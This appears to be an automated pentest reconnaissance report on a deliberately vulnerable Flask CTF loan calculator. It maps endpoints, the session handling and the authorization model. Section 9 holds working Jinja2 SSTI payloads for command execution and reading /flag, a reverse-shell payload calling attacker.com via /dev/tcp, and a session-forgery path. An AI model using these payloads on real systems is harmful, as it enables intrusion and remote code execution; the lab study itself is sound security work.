# Reconnaissance Deliverable:

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the Flask loan calculator application's attack surface, with special emphasis on authorization and privilege escalation opportunities for the Authorization Analysis Specialist.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates.
- **Section 6.4 (Guards Directory):** Catalog of authorization controls - understand what each guard means before analyzing vulnerabilities.
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy and privilege mapping - use this to understand the privilege lattice and identify escalation targets.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints for horizontal, vertical, and context-based authorization testing.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows system boundaries and data sensitivity levels. Pay special attention to flows marked with authorization guards and entities handling PII/sensitive data.

**Priority Order for Testing:** Start with Section 8's High-priority horizontal candidates, then vertical escalation endpoints for each role level, finally context-based workflow bypasses.

## 1. Executive Summary

The **Flask-based loan calculator web application** is a deliberately vulnerable CTF (Capture The Flag) challenge (XBEN-023-24) designed to demonstrate critical web security vulnerabilities. The application provides loan calculation functionality with basic authentication, profile management, and loan information display capabilities. From a security perspective, this application exhibits fundamental weaknesses across all security domains that would enable an external attacker to achieve **Remote Code Execution (RCE)** and complete system compromise.

**Core Technology Stack:**
- **Backend:** Python 3 with Flask 3.0.3 web framework
- **Database:** MySQL 5.7.15 (outdated, 2016 release)
- **ORM:** Flask-SQLAlchemy 3.1.1 with PyMySQL 1.1.0
- **Frontend:** Bootstrap CSS framework with jQuery 3.6.0
- **Template Engine:** Jinja2 (Flask default)
- **Web Server:** Apache 2.4.65 (Debian) with mod_wsgi
- **Deployment:** Docker containers orchestrated via docker-compose

**Primary Attack Surface:**
The application exposes **8 HTTP endpoints** on **port 80 (unencrypted HTTP only)**:
- 3 public endpoints (`/`, `/login`, `/logout`)
- 4 authenticated endpoints (`/home`, `/profile`, `/loan_details`, `/total_loan_payments`)
- 1 unauthenticated vulnerable endpoint (`/amortization` - **missing authentication check**)

**Critical Vulnerabilities Identified:**
1. **Server-Side Template Injection (SSTI)** in two endpoints enabling Remote Code Execution
2. **Missing authentication** on `/amortization` endpoint (publicly accessible SSTI)
3. **Plaintext password storage** in MySQL database
4. **Hardcoded credentials** (username: `test`, password: `test`)
5. **Weak Flask session secret** (`'your_secret_key'`) enabling session forgery
6. **No CSRF protection** on state-changing operations
7. **Complete absence of input validation**
8. **Outdated MySQL 5.7.15** with known CVEs

The application demonstrates a complete lack of security best practices: no HTTPS/TLS, no rate limiting, wildcard CORS policy (`Access-Control-Allow-Origin: *`), missing security headers, and no security monitoring or logging. The SSTI vulnerabilities in `/total_loan_payments` (authenticated) and `/amortization` (unauthenticated) represent the primary exploitation paths for achieving the CTF objective of flag retrieval from the container filesystem at `/flag`.

## 2. Technology & Service Map

### Frontend
- **Framework:** Bootstrap CSS 5.x (bootstrap.min.css)
- **JavaScript Library:** jQuery 3.6.0 (jquery.min.js)
- **Template Engine:** Jinja2 (server-side rendering)
- **Authentication UI:** HTML forms with POST submission (no client-side validation)
- **Static Assets:** Served from `/static/` directory via Flask
- **No JavaScript Frameworks:** No React, Vue, or Angular detected

### Backend
- **Language:** Python 3 (3.9+ compatible, based on Debian Bullseye-slim)
- **Framework:** Flask 3.0.3 (released April 2024, modern version)
- **ORM:** Flask-SQLAlchemy 3.1.1
- **Database Driver:** PyMySQL 1.1.0 (pure-Python MySQL client)
- **Session Management:** Flask default signed cookies (itsdangerous library, HMAC-SHA256)
- **Authentication:** Custom implementation (no Flask-Login or OAuth)
- **Web Server:** Apache 2.4.65 with mod_wsgi
- **WSGI Entry Point:** `ssti_blind_loan_calculator.wsgi`

### Infrastructure
- **Hosting Provider:** Docker containers (local deployment)
- **CDN:** None
- **Database Type:** MySQL 5.7.15 (standalone container)
- **Container Orchestration:** docker-compose
- **Network:** Docker bridge network (internal isolation)
- **Port Exposure:** Port 80 (HTTP) dynamically mapped to host
- **TLS/HTTPS:** NOT CONFIGURED (HTTP only)

### Identified Subdomains
**From subfinder scan (not directly relevant to localhost deployment):**
- mse-ca-mail.corp.mse.localhost
- mail.localhost
- autodiscover.localhost
- www.localhost
- Various other localhost subdomains (likely from subfinder's general localhost scanning)

**Note:** These subdomains are not active for the target application at `localhost:37579`.

### Open Ports & Services
**From nmap scan of localhost:**
- **Port 80/tcp:** Caddy httpd (not directly serving application)
- **Port 443/tcp:** SSL/HTTPS (not configured for application)
- **Port 37579/tcp:** Apache 2.4.65 serving Flask application (target)
- **Port 22/tcp:** OpenSSH 9.9
- **Port 3306/tcp:** MySQL 5.7.15 (internal Docker network only, not exposed to host)

**Target Application:**
- **URL:** `http://localhost:37579/`
- **Server Header:** `Apache/2.4.65 (Debian)`
- **Detected Technology:** Flask (via whatweb 302 redirect to `/login`)

## 3. Authentication & Session Management Flow

### Entry Points
- **Primary:** `/login` (GET for form display, POST for credential submission)
- **Registration:** NOT IMPLEMENTED (no user registration functionality)
- **SSO/OAuth:** NOT IMPLEMENTED (no third-party authentication)

### Mechanism

**Step-by-Step Authentication Flow:**

1. **User Navigation:**
   - User navigates to `http://localhost:37579/`
   - Application redirects (302) to `/login` (routes.py:17-19)

2. **Login Form Display:**
   - `/login` GET request renders `login.html` template
   - Form contains two fields: `username` and `password`
   - No client-side validation, no CAPTCHA, no rate limiting

3. **Credential Submission:**
   - User submits credentials via POST to `/login`
   - Flask extracts: `username = request.form['username']` (line 25)
   - Flask extracts: `password = request.form['password']` (line 26)

4. **Authentication Validation (CRITICAL VULNERABILITY):**
   - **Plaintext password comparison in database query** (line 27):
     ```python
     user = User.query.filter_by(username=username, password=password).first()
     ```
   - Password stored in database as plaintext VARCHAR(50)
   - No password hashing (bcrypt, argon2, PBKDF2)
   - SQLAlchemy ORM generates parameterized query (SQL injection protected)
   - Timing attack vulnerable (database query timing differs for valid/invalid users)

5. **Session Creation (SUCCESS PATH):**
   - If user found: `session['user_id'] = user.id` (line 30)
   - Flask signs session cookie with HMAC-SHA256 using `app.secret_key`
   - Session cookie sent to browser via `Set-Cookie` header
   - Cookie format: `session=[base64_payload].[timestamp].[signature]`
   - Redirect (302) to `/home` (line 32)

6. **Authentication Failure:**
   - If user not found: Re-render `login.html` with error message (line 35)
   - Generic error: `'Invalid username or password'` (good practice - no user enumeration)

### Code Pointers

**Primary Authentication File:**
- **File:** `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-023-24/app/website/app/routes.py`
- **Function:** `login()` at lines 22-36

**Session Configuration:**
- **File:** `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-023-24/app/website/app/__init__.py`
- **Secret Key:** Line 8: `app.secret_key = 'your_secret_key'` (**CRITICAL VULNERABILITY**)
- **Comment:** Line 7: `# Change this to a secure secret key` (never changed)

**User Model:**
- **File:** `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-023-24/app/website/app/models.py`
- **Password Field:** Line 8: `password = db.Column(db.String(50), nullable=False)` (plaintext)

**Hardcoded Test Credentials:**
- **File:** `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-023-24/app/website/app/__init__.py`
- **Lines:** 19-34
- **Username:** `test`
- **Password:** `test`
- **Created:** Automatically on first application startup

### 3.1 Role Assignment Process

**Role Determination:**
The application implements an **extremely simple binary authorization model** with NO role-based access control:
- **Anonymous:** No `user_id` in session
- **Authenticated User:** `user_id` present in session

**Role Assignment:**
- **Method:** Session flag set during login
- **Code:** `session['user_id'] = user.id` (routes.py:30)
- **Storage:** Flask signed session cookie (client-side)
- **NO role field** in User model - all authenticated users have identical privileges

**Default Role:**
- **New Users:** Cannot register (no registration functionality)
- **Test User:** Created automatically with username `test`, password `test`
- **All Users:** Same privilege level (no admin, no power user)

**Role Upgrade Path:**
- **NOT APPLICABLE:** No role hierarchy exists
- **No Admin Functionality:** No administrative interface or privileged operations
- **No Privilege Escalation:** All authenticated users have identical access rights

**Code Implementation:**
- **User Model:** `/Users/khaushik/keygraph/pentest/shannon/repos/XBEN-023-24/app/website/app/models.py`
- **No Role Field:** User table contains id, username, password, name, lastname, email, loan_amount, loan_term_months, monthly_payment (no role/privilege field)

### 3.2 Privilege Storage & Validation

**Storage Location:**
- **Primary:** Flask session cookie (client-side signed cookie)
- **Session Data:** `{'user_id': <integer>}` (only user ID stored)
- **Cookie Name:** `session`
- **Signing Algorithm:** HMAC-SHA256
- **Secret Key:** `'your_secret_key'` (hardcoded, weak)

**Validation Points:**
All protected endpoints use **inline session validation** (NO middleware/decorators):

**Pattern:**
```python
user_id = session.get('user_id')
if user_id:
    # Authorized code path
    user = User.query.get(user_id)
    # ...endpoint logic...
else:
    return redirect(url_for('login'))
```

**Validation Locations:**
- `/home` - routes.py:49-55
- `/profile` - routes.py:61-79
- `/loan_details` - routes.py:85-92
- `/total_loan_payments` - routes.py:98-119
- `/amortization` - **MISSING VALIDATION** (routes.py:122-177)

**Cache/Session Persistence:**
- **Session Lifetime:** 31 days (Flask default `PERMANENT_SESSION_LIFETIME`)
- **No Expiration:** Sessions never timeout from inactivity
- **No Refresh:** No session renewal mechanism
- **Client-Side Storage:** Session data in browser cookie (no server-side state)

**Code Pointers:**
- **Session Creation:** routes.py:30
- **Session Validation:** routes.py:49, 61, 85, 98 (inline checks)
- **Session Destruction:** routes.py:42

### 3.3 Role Switching & Impersonation

**Impersonation Features:**
- **NOT IMPLEMENTED:** No admin impersonation functionality
- **No Role Switching:** No "sudo mode" or privilege elevation
- **No "Act As" Feature:** No ability to impersonate other users

**Audit Trail:**
- **NOT IMPLEMENTED:** No logging of authentication events
- **No Session Audit:** No tracking of session creation/termination
- **No Access Logs:** Standard Apache access logs only (no security event logging)

**Code Implementation:**
- **N/A:** No code exists for role switching or impersonation

## 4. API Endpoint Inventory

**Network Surface Focus:** Only network-accessible API endpoints served by the Flask application at `http://localhost:37579/`. Excludes development tools, CLI scripts, and build utilities.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|---------------------|-------------------------|---------------------------|
| GET | `/` | anon | None | None (public redirect) | Simple redirect to `/login`. No user input processing. **File:** routes.py:17-19 |
| GET | `/login` | anon | None | None (authentication endpoint) | Displays login form. Renders `login.html` template. **File:** routes.py:22-36 |
| POST | `/login` | anon | None | None (authentication endpoint) | Processes credentials, creates session on success. **Plaintext password comparison**. Hardcoded test credentials (`test:test`). **File:** routes.py:24-36 |
| GET | `/logout` | anon | None | None (explicit session clear) | Clears `session['user_id']` and redirects to login. No CSRF protection. **File:** routes.py:39-43 |
| GET | `/home` | user | None | Inline session check | User dashboard displaying welcome message and loan status. **Auth:** routes.py:49-55. **File:** routes.py:46-55 |
| GET | `/profile` | user | None | Inline session check | Displays user profile form with loan information. **Auth:** routes.py:61. **File:** routes.py:58-79 |
| POST | `/profile` | user | None | Inline session check | Updates user profile (name, email, loan details). **NO input validation**, **NO CSRF protection**. Type conversion can crash app. **Auth:** routes.py:61. **File:** routes.py:58-79 |
| GET | `/loan_details` | user | None | Inline session check | Displays loan details with "Show Amortization Table" button. Contains iframe that loads `/amortization`. **Auth:** routes.py:85. **File:** routes.py:82-92 |
| GET | `/total_loan_payments` | user | `principal` (query), `payment` (query), `term` (query) | Inline session check | **CRITICAL SSTI VULNERABILITY**. Calculates total loan payments, returns JSON. `principal` parameter has **NO validation** and flows directly into `render_template_string()`. **RCE possible**. **Auth:** routes.py:98. **File:** routes.py:95-119 |
| GET | `/amortization` | **NONE (MISSING AUTH!)** | `term` (query) | **MISSING** | **CRITICAL SSTI VULNERABILITY + NO AUTH**. Generates amortization table HTML. Weak blacklist filter blocks `{`, `}`, `%` but is bypassable. **Publicly accessible RCE vulnerability**. **File:** routes.py:122-177 |

**Static Asset Endpoints (not included in vulnerability analysis):**
- GET `/static/css/bootstrap.min.css` - Bootstrap framework CSS
- GET `/static/css/style.css` - Custom application CSS
- GET `/static/js/jquery.min.js` - jQuery 3.6.0 library
- GET `/static/js/bootstrap.bundle.min.js` - Bootstrap JavaScript bundle

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** Only input vectors accessible through the deployed Flask application at `http://localhost:37579/`. Excludes local-only scripts, development tools, and build utilities.

### URL Parameters (Query Strings)

| Parameter Name | Endpoint | Data Type | Validation | File:Line | Security Issues |
|----------------|----------|-----------|------------|-----------|-----------------|
| `principal` | `/total_loan_payments` | String | **NONE** | routes.py:101 | **SSTI vulnerability - RCE possible**. No validation, flows directly to `render_template_string()` |
| `payment` | `/total_loan_payments` | Float | Type conversion only | routes.py:102 | No range validation, negative values accepted |
| `term` | `/total_loan_payments` | Integer | Type conversion only | routes.py:103 | No range validation, negative values accepted |
| `term` | `/amortization` | String | Weak blacklist (blocks `{`, `}`, `%`) | routes.py:125, 128-129 | **SSTI vulnerability - RCE possible**. Blacklist bypassable, **NO authentication required** |

### POST Body Fields (JSON/Form)

**Login Endpoint (`/login` POST):**
| Field Name | Data Type | Validation | File:Line | Security Issues |
|-----------|-----------|------------|-----------|-----------------|
| `username` | String | **NONE** | routes.py:25 | No length validation (DB limit: VARCHAR 50), plaintext comparison, timing attacks possible |
| `password` | String | **NONE** | routes.py:26 | **Plaintext storage**, no complexity requirements, no rate limiting |

**Profile Update Endpoint (`/profile` POST):**
| Field Name | Data Type | Validation | File:Line | Security Issues |
|-----------|-----------|------------|-----------|-----------------|
| `name` | String | **NONE** | routes.py:66 | No length validation (DB limit: VARCHAR 50), no sanitization |
| `lastname` | String | **NONE** | routes.py:67 | No length validation (DB limit: VARCHAR 50), no sanitization |
| `email` | String | **NONE** | routes.py:68 | **No email format validation**, accepts invalid emails like "notanemail" |
| `loan_amount` | Float | Type conversion only | routes.py:69 | **No error handling** - ValueError crashes app, negative values accepted |
| `loan_term_months` | Integer | Type conversion only | routes.py:70 | **No error handling** - ValueError crashes app, negative/zero values accepted |
| `monthly_payment` | Float | Type conversion only | routes.py:71 | **No error handling** - ValueError crashes app, negative values accepted |

### HTTP Headers

**No application-specific headers are processed.** The application does not:
- Read or process `X-Forwarded-For`
- Read custom headers
- Use headers for authentication (no Bearer tokens, API keys)
- Implement CORS preflight handling beyond wildcard Allow-Origin

**Headers Set by Application:**
- `Access-Control-Allow-Origin: *` (Apache config, wildcard CORS)
- `Cache-Control` headers (conflicting values, buggy implementation)

### Cookie Values

**Session Cookie (`session`):**
- **Purpose:** Stores authenticated user's ID
- **Format:** Base64-encoded signed JSON: `payload.timestamp.signature`
- **Signing Key:** `'your_secret_key'` (hardcoded, weak)
- **Data Structure:** `{'user_id': <integer>}`
- **Security Issues:** 
  - Weak secret enables session forgery
  - No HttpOnly flag explicitly configured (relies on Flask default)
  - No Secure flag (cookies sent over HTTP)
  - No SameSite flag (CSRF vulnerable)

**No other application cookies are used.**

## 6. Network & Interaction Map

**Network Surface Focus:** Only components part of the deployed, network-accessible infrastructure at `http://localhost:37579/`. Excludes local development environments, build CI systems, and local-only tools.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| Internet_Attacker | ExternAsset | Internet | N/A | None | External attacker accessing application via public URL |
| FlaskApp_Apache | Service | App | Apache/2.4.65 + Flask/3.0.3 + Python/3 | PII, Tokens, Passwords | Main application backend, **plaintext passwords**, SSTI vulnerabilities |
| MySQL_Database | DataStore | Data | MySQL/5.7.15 | PII, Tokens, Passwords | Stores user data, **outdated version** (2016), plaintext passwords |
| Docker_Host | AdminPlane | Admin | Docker/docker-compose | Config, Secrets | Container orchestration, exposes port 37579 |

### 6.2 Entity Metadata

| Title | Metadata Key: Value |
|-------|-------------------|
| FlaskApp_Apache | Hosts: `http://localhost:37579`; Endpoints: `/`, `/login`, `/logout`, `/home`, `/profile`, `/loan_details`, `/total_loan_payments`, `/amortization`; Auth: Session Cookie (signed with 'your_secret_key'); Dependencies: MySQL_Database; Vulnerabilities: SSTI (RCE), Plaintext Passwords, Weak Secret Key, Missing Auth on /amortization |
| MySQL_Database | Engine: `MySQL 5.7.15`; Exposure: `Internal Docker Network Only`; Port: `3306` (not exposed to host); Consumers: `FlaskApp_Apache`; Credentials: `root:loan_calculator` (hardcoded in source); Known CVEs: CVE-2017-3600, CVE-2017-3633, CVE-2018-2562 |
| Docker_Host | Network: `bridge` (default Docker network); Port Mapping: `37579:80` (dynamic host port); Containers: `loan_calculator` (Flask app), `db` (MySQL); Build Args: FLAG passed to container |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| Internet_Attacker → FlaskApp_Apache | HTTP | `:37579 /` | None | Public |
| Internet_Attacker → FlaskApp_Apache | HTTP | `:37579 /login` | None | Public |
| Internet_Attacker → FlaskApp_Apache | HTTP | `:37579 /amortization` | **MISSING AUTH** | Public (VULNERABILITY) |
| Internet_Attacker → FlaskApp_Apache | HTTP | `:37579 /home` | auth:user | PII |
| Internet_Attacker → FlaskApp_Apache | HTTP | `:37579 /profile` | auth:user | PII |
| Internet_Attacker → FlaskApp_Apache | HTTP | `:37579 /loan_details` | auth:user | PII |
| Internet_Attacker → FlaskApp_Apache | HTTP | `:37579 /total_loan_payments` | auth:user | Public (but vulnerable to SSTI) |
| FlaskApp_Apache → MySQL_Database | TCP | `:3306` | vpc-only | PII, Tokens, Passwords |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|-----------|----------|-----------|
| auth:user | Auth | Requires valid Flask session cookie containing `user_id`. Implemented as inline check: `user_id = session.get('user_id'); if user_id:` at beginning of protected route handlers. |
| vpc-only | Network | Communication restricted to Docker internal network. MySQL port 3306 not exposed to host. |
| **MISSING on /amortization** | Auth | **CRITICAL VULNERABILITY**: `/amortization` endpoint lacks `auth:user` guard. Publicly accessible without authentication. |

**Authorization Pattern:**
- **Type:** Inline session validation (no middleware/decorators)
- **Pattern:** `user_id = session.get('user_id'); if user_id: [authorized code] else: redirect('/login')`
- **Locations:** routes.py lines 49, 61, 85, 98
- **Missing:** routes.py lines 122-177 (`/amortization` endpoint)

## 7. Role & Privilege Architecture

This section maps the application's authorization model for the Authorization Analysis Specialist.

### 7.1 Discovered Roles

| Role Name | Privilege Level | Scope/Domain | Code Implementation |
|-----------|----------------|--------------|---------------------|
| anonymous | 0 | Global | Implicit - absence of `session['user_id']`. No code defines this role explicitly. |
| user | 1 | Global | Session-based flag. Created at routes.py:30: `session['user_id'] = user.id`. No role field in User model. |

**CRITICAL FINDING:** The application implements a **binary authorization model** with only two states: unauthenticated (anonymous) and authenticated (user). There is **NO role-based access control**, NO admin role, NO privilege hierarchy, and NO differentiation among authenticated users.

**User Model Structure (models.py:5-14):**
```python
class User(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(50), unique=True, nullable=False)
    password = db.Column(db.String(50), nullable=False)  # PLAINTEXT
    name = db.Column(db.String(50), nullable=False)
    lastname = db.Column(db.String(50), nullable=False)
    email = db.Column(db.String(100), nullable=False)
    loan_amount = db.Column(db.Float, nullable=False)
    loan_term_months = db.Column(db.Integer, nullable=False)
    monthly_payment = db.Column(db.Float, nullable=False)
```

**No role, is_admin, privilege_level, or permissions field exists.**

### 7.2 Privilege Lattice

```
Privilege Ordering (→ means "can access resources of"):
anonymous → user

Parallel Isolation:
NONE (no parallel roles exist)
```

**Role Hierarchy:**
```
┌─────────────────────────────────────┐
│         ANONYMOUS                   │
│  (No session['user_id'])            │
│  Access: /login, /, /amortization   │
└──────────────┬──────────────────────┘
               │
               │ Authentication via /login
               ↓
┌─────────────────────────────────────┐
│     AUTHENTICATED USER              │
│  (session['user_id'] exists)        │
│  Access: ALL protected endpoints    │
└─────────────────────────────────────┘
```

**Dominance Relationships:**
- **authenticated user > anonymous:** Can access protected resources
- **No hierarchy among authenticated users:** All have identical privileges

**No Role Switching Mechanisms:**
- No impersonation features
- No "sudo mode" or privilege elevation
- No "act as" functionality
- No role promotion/demotion

### 7.3 Role Entry Points

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|--------------------------|---------------------|
| anonymous | `/login` | `/`, `/login`, `/logout`, `/amortization` (VULNERABILITY) | N/A (unauthenticated) |
| user | `/home` | All anonymous routes PLUS: `/home`, `/profile`, `/loan_details`, `/total_loan_payments` | Session cookie (signed with `'your_secret_key'`) |

**Authentication Flow:**
1. Anonymous user navigates to application
2. Redirected to `/login` (routes.py:19)
3. Submits credentials via POST
4. On success: `session['user_id'] = user.id` (routes.py:30)
5. Redirected to `/home` (routes.py:32)

**Default Credentials:**
- **Username:** `test`
- **Password:** `test`
- **Created:** Automatically on first application startup (__init__.py:19-34)

### 7.4 Role-to-Code Mapping

| Role | Middleware/Guards | Permission Checks | Storage Location |
|------|-------------------|-------------------|------------------|
| anonymous | None | No checks required | N/A (no session data) |
| user | None (inline checks only) | `user_id = session.get('user_id'); if user_id:` | Flask session cookie (client-side signed cookie) |

**Authorization Check Locations:**
- **File:** routes.py
- **Lines:** 49 (`/home`), 61 (`/profile`), 85 (`/loan_details`), 98 (`/total_loan_payments`)
- **Missing:** Line 122 (`/amortization` has NO check)

**Session Management:**
- **Creation:** routes.py:30 - `session['user_id'] = user.id`
- **Validation:** `session.get('user_id')` returns truthy value
- **Destruction:** routes.py:42 - `session.pop('user_id', None)`
- **Secret Key:** __init__.py:8 - `app.secret_key = 'your_secret_key'`

## 8. Authorization Vulnerability Candidates

This section identifies specific endpoints and patterns that are prime candidates for authorization testing, organized by vulnerability type.

### 8.1 Horizontal Privilege Escalation Candidates

**FINDING:** The application has **MINIMAL IDOR surface** because:
- No endpoints accept user-supplied object IDs in URL paths or query parameters
- All data access is scoped to `session['user_id']`
- No cross-user data access functionality exists

| Priority | Endpoint Pattern | Object ID Parameter | Data Type | Sensitivity |
|----------|------------------|-------------------|-----------|-------------|
| Low | `/profile` (current user only) | None (session-scoped) | user_data | Uses `User.query.get(session['user_id'])` - no IDOR possible with current implementation |
| Low | `/home` (current user only) | None (session-scoped) | user_data | Uses `User.query.get(session['user_id'])` - no IDOR possible with current implementation |
| Low | `/loan_details` (current user only) | None (session-scoped) | financial | Uses `User.query.get(session['user_id'])` - no IDOR possible with current implementation |

**IDOR Testing Recommendations:**
- **Current Risk:** LOW - no object ID parameters exist
- **Future Risk:** HIGH - if developers add parameters like `/profile?user_id=X` without validation, IDOR would be trivial due to lack of ownership checks
- **Session Forgery:** The weak secret key (`'your_secret_key'`) enables forging session cookies with arbitrary `user_id` values, achieving horizontal privilege escalation

**Session Forgery Attack Path:**
1. Attacker obtains Flask secret key from source code
2. Attacker crafts session cookie: `{'user_id': <target_user_id>}`
3. Attacker signs cookie with HMAC-SHA256 using secret key
4. Attacker sends requests with forged session cookie
5. Application executes `User.query.get(<target_user_id>)`
6. Attacker accesses victim's profile, loan data, and can modify victim's information via `/profile` POST

### 8.2 Vertical Privilege Escalation Candidates

**FINDING:** **NOT APPLICABLE** - The application has NO role hierarchy or administrative functionality.

**Analysis:**
- No admin endpoints detected
- No privileged operations (user management, system configuration, etc.)
- All authenticated users have identical access rights
- No admin panel, no admin routes, no admin dashboard

**Potential Future Vulnerability:**
If developers add admin functionality without implementing proper authorization middleware:
- Missing authorization checks would be likely (as demonstrated by `/amortization`)
- Inline check pattern is error-prone and easily forgotten
- No centralized authorization enforcement mechanism exists

**Vertical Escalation Testing:**
- **Not applicable** with current application design
- No "Target Role" to escalate to (no admin role exists)

### 8.3 Context-Based Authorization Candidates

**FINDING:** The application has MINIMAL multi-step workflows. Most endpoints are independent operations.

| Workflow | Endpoint | Expected Prior State | Bypass Potential |
|----------|----------|---------------------|------------------|
| Login → Dashboard | `/home` | Valid session from `/login` | **Bypassable via session forgery** (weak secret key) |
| Login → Profile | `/profile` | Valid session from `/login` | **Bypassable via session forgery** (weak secret key) |
| Dashboard → Loan Details | `/loan_details` | Valid session | **Bypassable via session forgery** (weak secret key) |
| Loan Details → Amortization | `/amortization` | Should require session from `/loan_details` | **CRITICAL: NO authentication check** - direct access possible |

**Critical Context-Based Vulnerability:**
- **Endpoint:** `/amortization`
- **Expected State:** Should only be accessible from authenticated `/loan_details` page via iframe
- **Actual State:** Completely public, no authentication required
- **Bypass:** Direct URL access: `http://localhost:37579/amortization?term=60`
- **Impact:** Unauthenticated access to SSTI-vulnerable endpoint (RCE possible)

**No Multi-Step Form Workflows:**
- No multi-page checkout process
- No wizard-style forms
- No complex approval workflows
- Profile update is single-step POST operation

## 9. Injection Sources (Command Injection and SQL Injection)

**Network Surface Focus:** Only injection sources reachable through the Flask application at `http://localhost:37579/`. Excludes local-only scripts, build tools, and development utilities.

### Command Injection Sources

**Direct Command Injection Sources Found: 0**

**Analysis Results:**
- **No `os.system()` calls** - Verified absent in all network-accessible code
- **No `os.popen()` calls** - Verified absent in application logic
- **No `subprocess.*` calls** - Verified absent (subprocess module not imported)
- **No `eval()` or `exec()` calls** - Verified absent
- **No shell command execution** - Verified absent

**Indirect Command Execution via SSTI:**

While no direct command injection sources exist, the **Server-Side Template Injection (SSTI) vulnerabilities** can be exploited to execute commands via Python's built-in objects:

#### SSTI Source #1: `/total_loan_payments` - `principal` parameter

**Complete Data Flow Path:**

1. **Input Extraction** (routes.py:101):
   ```python
   principal = request.args.get('principal', type=str)
   ```
   - User-controlled query parameter
   - Extracted as string type
   - **NO validation applied**

2. **Template Construction** (routes.py:110-112):
   ```python
   json_template = f"""
   {{ "loan_principal": "{{{{ principal }}}}" ,"monthly_payment": "{{{{ payment }}}}", "loan_term_amount": "{{{{ term }}}}", "total_loan_payments": "{{{{ payment*term }}}}" }}
   """
   ```
   - User input embedded directly into f-string
   - F-string evaluation happens BEFORE Jinja2 processing
   - Creates injectable template structure

3. **Dangerous Sink** (routes.py:115):
   ```python
   return render_template_string(json_template, principal=principal, payment=payment, term=term, content_type='application/json')
   ```
   - Jinja2 processes user-controlled template structure
   - No sanitization or escaping applied
   - Full template evaluation enabled

**Command Execution Attack Path:**
```
User Input: ?principal={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
           ↓
F-String:  json_template = f'{{ "loan_principal": "{{{{request.application...}}}}" ,... }}'
           ↓
Jinja2:    Evaluates {{request.application.__globals__...}} expression
           ↓
Python:    Imports os module, calls popen('id'), executes shell command
           ↓
Response:  Command output returned in JSON response
```

**Example Payloads:**
- **Basic RCE:** `?principal={{request.application.__globals__.__builtins__.__import__('os').popen('whoami').read()}}`
- **Flag Retrieval:** `?principal={{request.application.__globals__.__builtins__.__import__('os').popen('cat /flag').read()}}`
- **Reverse Shell:** `?principal={{request.application.__globals__.__builtins__.__import__('os').popen('bash -i >& /dev/tcp/attacker.com/4444 0>&1').read()}}`

**Authentication Required:** YES (inline session check at routes.py:98)

#### SSTI Source #2: `/amortization` - `term` parameter

**Complete Data Flow Path:**

1. **Input Extraction** (routes.py:125):
   ```python
   term = request.args.get('term', type=str)
   ```
   - User-controlled query parameter
   - Extracted as string type

2. **Weak Blacklist Filter** (routes.py:128-129):
   ```python
   if "{" in term or "}" in term or "%" in term:
       return Response('GET parameter `term` contains forbidden characters.', status=400)
   ```
   - Blocks only `{`, `}`, `%` characters
   - Does NOT block: `_`, `.`, `[`, `]`, `|`, `#`
   - Insufficient for SSTI prevention

3. **Template Construction** (routes.py:163):
   ```python
   {{% for row in range({term}) %}}
   ```
   - Term value injected directly into Jinja2 for loop
   - Embedded in HTML template string

4. **Dangerous Sink** (routes.py:177):
   ```python
   return render_template_string(table_template)
   ```
   - Jinja2 processes user-controlled template
   - Blacklist may prevent basic payloads but sophisticated bypasses possible

**Command Execution Attack Path:**
```
User Input: ?term=1);__import__('os').popen('whoami').read();(1
           ↓
F-String:  {% for row in range(1);__import__('os').popen('whoami').read();(1) %}
           ↓
Jinja2:    Evaluates range(1), then Python expression, then range(1)
           ↓
Python:    Imports os module, executes shell command
           ↓
Response:  Command output in HTML response
```

**Bypass Techniques for Blacklist:**
- Unicode/hex encoding of blocked characters
- Alternative Python syntax not requiring `{`, `}`, `%`
- Exploitation via alternative Jinja2 constructs

**Authentication Required:** **NO (CRITICAL VULNERABILITY)** - Endpoint completely lacks authentication check

### SQL Injection Sources

**Direct SQL Injection Sources Found: 0**

**Database Technology:** MySQL 5.7.15 with SQLAlchemy ORM

**Analysis Results:**

All database queries use **SQLAlchemy ORM** with automatic parameterization:

1. **Login Authentication Query** (routes.py:27):
   ```python
   user = User.query.filter_by(username=username, password=password).first()
   ```
   - **Safe:** ORM `.filter_by()` with keyword arguments
   - **Generated SQL:** `SELECT * FROM user WHERE username=? AND password=?`
   - **Parameterized:** Values passed as bind parameters
   - **No SQL injection possible**

2. **User Retrieval by ID** (routes.py:51, 63, 87):
   ```python
   user = User.query.get(user_id)
   ```
   - **Safe:** ORM `.get()` method
   - **Type-safe:** user_id from session (integer)
   - **No SQL injection possible**

3. **Profile Update** (routes.py:66-72):
   ```python
   user.name = request.form['name']
   user.lastname = request.form['lastname']
   user.email = request.form['email']
   user.loan_amount = float(request.form['loan_amount'])
   user.loan_term_months = int(request.form['loan_term_months'])
   user.monthly_payment = float(request.form['monthly_payment'])
   db.session.commit()
   ```
   - **Safe:** ORM attribute assignment
   - **Generated SQL:** `UPDATE user SET name=?, lastname=?, email=?, ... WHERE id=?`
   - **Parameterized:** All values passed as bind parameters
   - **No SQL injection possible**

**Verified Absence of Dangerous Patterns:**
- No `.execute()` calls with raw SQL strings
- No string concatenation in queries
- No `text()` function usage
- No `executemany()` with user-controlled SQL
- No raw SQL construction

**CONCLUSION:** The application is **NOT vulnerable to SQL injection**. SQLAlchemy ORM's parameterized query generation provides robust protection against SQL injection across all database operations.

### Summary: Injection Sources

| Type | Count | High-Severity Sources | Network-Accessible |
